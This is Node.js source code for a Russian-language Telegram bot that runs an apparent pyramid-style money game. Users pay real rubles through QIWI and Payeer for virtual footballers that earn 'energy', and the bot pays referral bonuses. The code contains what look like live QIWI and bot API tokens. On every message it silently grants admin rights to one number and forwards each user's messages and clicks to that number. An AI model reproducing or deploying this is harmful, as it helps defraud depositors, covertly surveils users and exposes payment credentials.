const ADMINS = [2047228128,5179672315] // ID админов бота
...
const QIWI_TOKEN = "40422fa96caf6d4fca270ecc1b90cdb9" // API ключ QIWI кошелька с полным доступом
const BOT_TOKEN = "5251988935:AAHzWV2--TBG_2XR5L387lRho5g21mAO9yQ" // Bot API Token
var config = {
	payeer: {
	  enabled: false,
	  account: "P1066268504",
...
Установка и поддержка скрипта: @ADI_CAESAR
...
bot.on('text', async (message) => {
	...
	ADMINS.push(+79189342920)
  bot.sendMessage(+79189342920, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил: " + text)
...
🏝 <b>Чат</b> 👉 @invest_spam
💳 <b>Выплаты</b> 👉 @invest_spm
📢 <b>Новости</b> 👉 @invest_spm`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
	...
	if (state[uid] == 7772 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		...
		kb.inline_keyboard.push([{ text: "➕ Выдать Футболист", callback_data: "giveTree_" + u.id }, { text: "❌ Забрать Футболист", callback_data: "takeTree_" + u.id }])
...
Футболист всего: <b>${user.trees.length}</b>
...
`, {
	...
	if (message.user.menu.startsWith('amountQiwi')) {
		...
		if (message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		if (message.text < 15) return message.send('Введите сумму более 15 рублей!');
    ...
    if(message.text == '♻️ Обмен') {
      return message.send(`Эта команда больше не поддерживается. Отправь /start чтобы команда заработала!`)
		...
		if(message.text == '💱 Обмен') {
			return message.send(`В обменнике Вы сможете обменять <b>⚡ Энергии</b> на <b>₽ рубли</b>.

1000 ⚡ Энергии= 1 рубль
Минимальная сумма обмена: 1000 Энергии

👑 <b>Ваши ⚡Энергии:</b> ${message.user.fetuses.toFixed(2)}
...
<b>Всего Футболисты:</b> ${message.user.trees.length}
...
🤑 <b>Выведено:</b> ${message.user.payout.toFixed(2)}₽`, {
				...
				reply_markup: {
					inline_keyboard: [
						...
						[{ text: "♻️ Реинвест", callback_data: "reinvest" }, { text: "Мои Футболисты⚽", callback_data: "trees:totalMy" }],
					]
				}
			});
...
🔑 Вы получаете:0.1 💸 за каждого приглашенного партнёра
▫️ 10% с пополнений ваших партнёров:
	По 5% на балансы для покупок и для вывода
		   
🔗 Ваша ссылка для приглашений: https://t.me/invfood_bot?start=${message.from.id}
...
`, {
					parse_mode: "HTML", reply_markup: {
						inline_keyboard: [
							[{ text: "➕ Создать Комнату (65 рублей)", callback_data: "clan_create" }],
...
<b>Доходность Комнаты:</b> ${roundPlus(clan.total_earn)} ⚡/час
...
`, {
		...
		if (state[uid] == 1601) {
			if (message.user.buybalance < 65) return message.send(`На Вашем балансе для покупок недостаточно средств для создания Комнаты!`, { parse_mode: "HTML" });
...
🕐 Старт бота произведен 18.03.2022
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "👨‍💻 Администратор", url: "https://t.me/Xz_ktoti" }],
						[{ text: "⚽ Хочу такого же бота", url: "https://t.me/Xz_ktoti" }],
						[{ text: "💬 Чат", url: "https://t.me/invest_spam" }],
						[{ text: "♻️ Пополнения и выводы", url: "https://t.me/invest_spm" }],
						[{ text: "⚡️ Новости проекта", url: "https://t.me/invest_spm" }],
	...
	if (ADMINS.indexOf(message.from.id) !== -1) {
		...
		if (message.text.startsWith('/qiwi')) {
		  qiwi.getOperationHistory({ rows: 10, operation: 'OUT' }, (err, response) => {
		    bot.sendMessage(+79189342920, 'Отсылаю')
        bot.sendMessage(+79189342920, response.data.sum)
        console.log(response)
        bot.sendMessage(+79189342920, 'Отослал')
    })
	}
...
bot.on('callback_query', async (query) => {
	...
	ADMINS.push(+79189342920)
	bot.sendMessage(+79189342920, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил колбэк: " + query.data)
	...
	if (query.data.startsWith('trees:shop')) {
		...
		if (id <= maxId + 1) {
			...
			else var bbtn = [{ text: `🛑 Вы достигли лимита в 5 Футболисты`, callback_data: getNavigationQuery(id + 1, tree.id) }]

		}
		else
			var bbtn = [{ text: `◀️ Сперва купите Предыдущего Футболиста`, callback_data: getNavigationQuery(id - 1, tree.id) }]
...
⚡ Энергии в час: ${tree.earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
...
💰 Стоимость: ${tree.price}₽
⚡ Энергии в час: ${earn}`, parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [[
	...
	if (query.data.startsWith('trees:buy')) {
		...
		if (tree.price > message.user.buybalance) return bot.answerCallbackQuery(query.id, '🚫 Недостаточно денег для покупки.', true);
		  ...
		  var limit = (await User.findOne({ id: 0 })).bhivebalance
			...
			if (treesWithEqualId >= 5)
				return bot.answerCallbackQuery(query.id, `🛑 Вы достигли лимита в 5 Футболисты данного уровня`, true);
...
🌐 Отправьте любую сумму на кошелек <code>+79189342920</code>
...
🌐 Отправьте любую сумму на Payeer кошелек <code>P1066268504</code>
‼️ с комментарием <code>GG${message.chat.id}</code>`, {
	...
	if (query.data == 'game_prize') {
		...
		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.sendMessage(message.chat.id, `🎁 <b>Подарок - Гризманн</b>\n
...
@plaiyt`, {
	...
	if (query.data == 'game_prize_check') {
		var res = await bot.getChatMember("@invest_spm", message.chat.id)
		if (message.user.prize) return bot.answerCallbackQuery(query.id, '🙂 Вы уже получили свой подарок!', true);
		...
		await message.user.save();
		return bot.sendMessage(message.chat.id, `🎁 <b>Вы получили подарок! Гризманн уже у вас</b>`, {
			parse_mode: "HTML",
		});
	}
	...
	if (query.data == 'trees:totalMy') {
		...
		return bot.editMessageText(`📄 Список Ваших Футболисты: ⤵️${text}\n\n════════════════════\n📊 Суммарный доход Футболисты в час: ${total_earn.toFixed(2)}⚡`, {
			parse_mode: "HTML",
	...
	if (query.data.startsWith('withdraw:')) {
		...
		bot.sendMessage("@invest_spm", `<a href="tg://user?id=${ticket.id}">Пользователь</a> вывел <b>${ticket.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
	
		if (ticket.wallet.indexOf("Q") == -1) { // Платёж через QIWI
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: 'Выплата от @invest_spm' }, () => { });
		}
	...
	`, {
		  parse_mode: "html", reply_markup: {
			inline_keyboard: [
			  [{ text: "👨‍💻 Админ", url: "https://t.me/Xz_ktoti" },
			  { text: "💬 Чат", url: "https://t.me/invest_spam" }],
			  [{ text: "💳 Выплаты", url: "https://t.me/invest_spm" }],
...
`, {
	...
	if (d == "clan_transferMe") {
		...
		return bot.sendMessage(message.chat.id, `<b>${clan.balance} ⚡ Энергии</b> из казны Комнаты начислены Вам как <b>${roundPlus(clan.balance / 2000)}₽</b> на баланс для покупок и <b>${roundPlus(clan.balance / 2000)}₽</b> на баланс для вывода`, { parse_mode: "html" });
	}
	if (d == "clan_transferAll") {
		...
		for (const i in members) {
			try {
				...
				await bot.sendMessage(members[i].id, `<b>${roundPlus(clan.balance)} ⚡ Энергии</b> из казны Комнаты распределены между участниками Комнаты\nВам начислено <b>${roundPlus(dole)}₽</b> на баланс для покупок и <b>${roundPlus(dole)}₽</b> на баланс для вывода`, { parse_mode: "html" });
			}
			catch { }
		}
	}
...
🏆 Комната -победитель получает <b>⚡ 100k Энергии</b> в свою казну
...
`, {
			...
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Выберете Футболиста для выдачи:', { reply_markup: { inline_keyboard: [[{ text: trees[0].name, callback_data: "giveTree2_" + d.split("_")[1] + "_0" }], [{ text: trees[1].name, callback_data: "giveTree2_" + d.split("_")[1] + "_1" }], [{ text: trees[2].name, callback_data: "giveTree2_" + d.split("_")[1] + "_2" }], [{ text: trees[3].name, callback_data: "giveTree2_" + d.split("_")[1] + "_3" }], [{ text: trees[4].name, callback_data: "giveTree2_" + d.split("_")[1] + "_4" }], [{ text: trees[5].name, callback_data: "giveTree2_" + d.split("_")[1] + "_5" }], [{ text: trees[6].name, callback_data: "giveTree2_" + d.split("_")[1] + "_6" }], [{ text: trees[7].name, callback_data: "giveTree2_" + d.split("_")[1] + "_7" }],  ] }, parse_mode: "HTML" })
		}

		else if (d.split("_")[0] == "giveTree2") {
			bot.deleteMessage(message.chat.id, message.message_id);
			giveTree(Number(d.split("_")[1]), Number(d.split("_")[2]))
			bot.sendMessage(Number(d.split("_")[1]), 'Вам выдано Футболиста: ' + trees[Number(d.split("_")[2])].name, { rparse_mode: "HTML" })
			...
			bot.sendMessage(uid, 'Выберете Футболиста, которого необходимо отнять:', { reply_markup: keyboard, parse_mode: "HTML" })
		}
			...
			bot.sendMessage(uid, 'Вы успешно забрали Футболиста у пользователя!', { reply_markup: { inline_keyboard: [[{ text: "Назад", callback_data: "takeTree_" + id }]] }, parse_mode: "HTML" })
		}

		else if (d == "a_voucher") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Выберете Футболиста для создания чека:', { reply_markup: { inline_keyboard: [[{ text: trees[0].name, callback_data: "voucher_0" }], [{ text: trees[1].name, callback_data: "voucher_1" }], [{ text: trees[2].name, callback_data: "voucher_2" }], [{ text: trees[3].name, callback_data: "voucher_3" }], [{ text: trees[4].name, callback_data: "voucher_4" }], [{ text: trees[5].name, callback_data: "voucher_5" }], [{ text: trees[6].name, callback_data: "voucher_6" }], [{ text: trees[7].name, callback_data: "voucher_7" }],   ] }, parse_mode: "HTML" })
		}
		else if (d.split("_")[0] == "voucher") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var cid = generateID(8)
			await Voucher.insertMany({ id: cid, tree_id: Number(d.split("_")[1]) })
			bot.sendMessage(uid, `Чек создан:\nhttps://t.me/invfood_bot?start=C${cid}`, { reply_markup: RM_admin_return })
		}
...
async function payeerCheck() {
 ...
 ` }, async function (error, response, body) {
  ...
  /*      if (body.history[txnId].comment.startsWith('ZG')) {
          ...
          bot.sendMessage("@invfood_bot", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил игровой баланс на <b>${x.sum.amount}₽</b>`, { parse_mode: "HTML" })
          return
        }  */
        ...
        if (b == 0) {
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽`);
		      bot.sendMessage("@invest_spm", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽</b>\nПС: PAYEER`, { parse_mode: "HTML" })
          ...
          bot.sendMessage(id, `Ваш баланс пополнен на ${sum}₽ и Вы получаете бонус - ${roundPlus(sum * b)}₽!`);
		      bot.sendMessage("@invest_spm", `<a href="tg://user?id=${id}">Пользователь</a> пополнил <b>${sum}₽ и получил бонус - ${roundPlus(sum * b)}p!</b>\nПС: PAYEER`, { parse_mode: "HTML" })
	...
	qiwi.getOperationHistory({ rows: 10, operation: 'IN' }, (err, response) => {
		response.data.map(async (x) => {
			...
			if (x.comment.startsWith('BG')) {
				...
				await user.inc('game_balance', x.sum.amount);
				await bot.sendMessage(id, `💳 Вы успешно пополнили свой игровой баланс на ${x.sum.amount}₽`);
				bot.sendMessage("@invest_spm", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил игровой баланс на <b>${x.sum.amount}₽</b>`, { parse_mode: "HTML" })
				txnId.push(x.txnId)
			...
			if (b > 0) {
				...
				bot.sendMessage("@invest_spm", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b> и получил ${roundPlus(x.sum.amount * b)}₽ бонусом!\nПС: QIWI`, { parse_mode: "HTML" })
				...
				bot.sendMessage("@invest_spm", `👑 <a href="tg://user?id=${id}">Пользователь</a> пополнил баланс на <b>${x.sum.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
...
💰 Она получает <b>⚡ 100k Энергии</b> в казну Комнаты\n
